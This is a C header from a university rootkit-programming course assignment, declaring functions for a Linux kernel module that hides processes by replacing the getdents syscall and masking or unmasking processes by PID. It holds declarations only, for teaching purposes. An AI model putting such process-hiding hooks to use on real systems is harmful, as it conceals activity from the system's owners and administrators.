
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: process_masking.h                                               */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: Header file for module `process_masking.c`                         */
/*                                                                             */
/*******************************************************************************/

#ifndef __PROCESS_MASKING__
#define __PROCESS_MASKING__

#include <linux/syscalls.h>

/* Declaration of functions */
int process_masking_init(int);
int process_masking_exit(void);

asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int, int);

int mask_process(pid_t);
int unmask_process(pid_t);

#endif
